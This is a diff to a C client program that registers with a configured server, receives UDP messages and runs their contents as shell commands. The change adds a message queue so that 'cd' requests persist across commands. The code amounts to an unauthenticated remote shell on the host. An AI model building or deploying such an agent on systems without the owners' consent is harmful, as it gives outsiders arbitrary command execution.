@@ -1,7 +1,8 @@
 #include "stdafx.h"
 static twc tc;
-int pdt[PDTLEN]; //children process discription table
-
+key_t uniquekey = 10000;
+static  int msgid;
+int pdt[PDTLEN]; 
 int __main__init()
 {
         memset(&tc,0,sizeof(tc));
@@ -9,9 +10,18 @@ int __main__init()
         signal(SIGCHLD,&signalHandel);  //reigster the function that deal with defunct process
         signal(SIGHUP,&signalHandel);  //reigster the function that deal with defunct process
 	signal(SIGINT,&signalHandel);  //reigster the function that deal with ctrl_c request
-        return  readconfig("wd1024.conf",&tc);
+        if((msgid = msgget(uniquekey, IPC_CREAT |  0666)) == -1) {
+	        print_error(errno);
+	        exit(errno);
+        }                
+        return  readconfig(CONTFILE,&tc);
 }
 
+typedef struct _msg_struc_
+{
+        long msgtype;
+        char text[MBUFSIZ];
+} sigmsg;
 
 int main() {
         int erro = __main__init();
@@ -19,6 +29,8 @@ int main() {
 	int cli_pro_id;
         int socket_descriptor;
         struct sockaddr_in sin;
+        char pathm[MBUFSIZ];
+        getcwd(pathm,MBUFSIZ);
         if(erro!=0)
         {
                 print_error(erro);
@@ -26,22 +38,27 @@ int main() {
         }
         unsigned char buffer[MESSAGEIDLEN+OPTIONLEN+MESSAGELEN+3];
         sin_len = inint__cd23(&socket_descriptor,&sin,tc.lport);
-        if(sin_len <0)
+        if(sin_len==-2)
         {
-                if(sin_len==-2)
-                {
-                        print_error(__PORT_HAS_BEEN_USE__);
-                }
-	        exit(-1);
+                print_error(__PORT_HAS_BEEN_USE__);
+	        return -2;
         }
-        printf("Waiting for data form server \n");
+        if(sin_len==-1)
+        {
+                print_error(__PORT_HAS_BEEN_USE__);
+	        return -2;
+        }
+        else
+        {
+                printf("[INFO] waiting for data form server \n");
+        }
         
         sendConIno_(tc.server_v4[0],tc.sport,0,tc.client_id);
         while(1)
         {
                 recvfrom(socket_descriptor,&buffer,sizeof(buffer),0,(struct sockaddr *)&sin,&sin_len);
 		if(0==(cli_pro_id=fork())){
-			message_deal_Hander(buffer);
+			message_deal_Hander(buffer,pathm);
 			return 0;
 		}
 		else
@@ -59,7 +76,15 @@ int main() {
                                 kill(cli_pro_id,SIGKILL);
                         }
 
-			printf("\nprocess:%d deal the message\n",cli_pro_id);
+                        sigmsg recvdate;
+                        if( msgrcv(msgid, (void  *)&recvdate, MBUFSIZ, STD_MSG, IPC_NOWAIT) == -1) {
+	                        print_error(errno);
+                        }
+
+                        else{
+                            strcpy(pathm,recvdate.text);
+                        }
+			//printf("\nprocess:%d deal the message\n",cli_pro_id);
 		}
     	}
         close(socket_descriptor);
@@ -71,12 +96,12 @@ void signalHandel(int signo) {
 	//the main use is deal with the defunct process
 	if(signo==SIGCHLD){
                 int childStatus;
-                for(int i = 0;i<10;i++){
+                for(int i = 0;i<PDTLEN;i++){
                        if(pdt[i]!=0)
                        {
                                 if(waitpid(pdt[i], &childStatus, WNOHANG)==pdt[i])
                                 {
-                                         printf("process:%d has been collection\n",pdt[i]);
+                          //               printf("process:%d has been collection\n",pdt[i]);
                                          pdt[i]=0;
                                 }
                         }
@@ -93,7 +118,7 @@ void signalHandel(int signo) {
     	return;
 
 }
-int message_deal_Hander(unsigned char * buffer)
+int message_deal_Hander(unsigned char * buffer,char *pathm)
 {
 	msg message;
         inint(&message);
@@ -107,17 +132,28 @@ int message_deal_Hander(unsigned char * buffer)
         {
                 return 0;
         }
-        printf("[\n\tmessageid:%d%d\n",message.messageid[0],message.messageid[1]);
-        printf("\trequest from server:%s",message.message);
-        printf("\tclientid:%d\n",message.clientid);
+        printf("message:%d%d from %d msg:%s",message.messageid[0],message.messageid[1],message.clientid,message.message);
         if((message.code&0x01)==1)
         {
-         //request
-        	printf("\ttype:request\n");
         	if((message.code&0x02)==2)
         	{
-        		writeValWithStatus(&message, cmd_system__0a40(message.message,resultbuffer,MESSAGELEN));
-			printf("\ttype:%s]\n","shell\n"); 
+                        if(((*(message.message))=='c')&&((*((message.message+1)))=='d'))
+                        {
+                                sigmsg send_msg;
+                                int popc = 3;
+                                while(*(message.message+popc)!='\n')
+                                       popc ++;
+                                *(message.message+popc) = 0;
+                                strcpy(send_msg.text,message.message+3);
+                                send_msg.msgtype = STD_MSG;
+                                if(msgsnd(msgid, (sigmsg  *)(&send_msg), MBUFSIZ, 0) == -1) {
+                                        print_error(errno);
+	                                exit(2);
+	                        }
+                                return 0;
+                        }
+        		writeValWithStatus(&message, cmd_system__0a40(message.message,resultbuffer,MESSAGELEN,pathm));
+			printf("type:%s","shell\n"); 
 			writeMessage(&message,resultbuffer);
 		}
 		else if((message.code&0x02)==0)
